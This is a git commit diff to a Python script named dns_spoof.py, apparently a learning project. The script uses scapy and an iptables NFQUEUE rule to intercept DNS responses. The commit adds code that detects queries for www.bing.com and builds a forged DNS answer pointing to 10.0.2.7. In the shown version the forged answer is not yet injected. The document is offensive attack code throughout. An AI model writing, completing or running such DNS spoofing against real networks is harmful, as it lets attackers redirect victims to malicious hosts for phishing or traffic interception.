8035c7578d581b31477dd72a97240c48d39cdf94
Jean Andrew Fuentes <jeanandrewfuentes@gmail.com>
2020-03-04 07:21:34 -0500

    Modify dns question and dns response in scapy

--- dns_spoof.py
+++ dns_spoof.py
@@ -6,7 +6,13 @@ import scapy.all as scapy
 def proccess_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
+        qname = scapy_packet[scapy.DNSQR].qname
+        if 'www.bing.com' in qname:
+            print("[+] Spoofing target: {}".format(qname))
+            answer = scapy.DNSRR(
+                rrname=qname,
+                rdata="10.0.2.7"
+            )
     packet.accept()
 
 subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
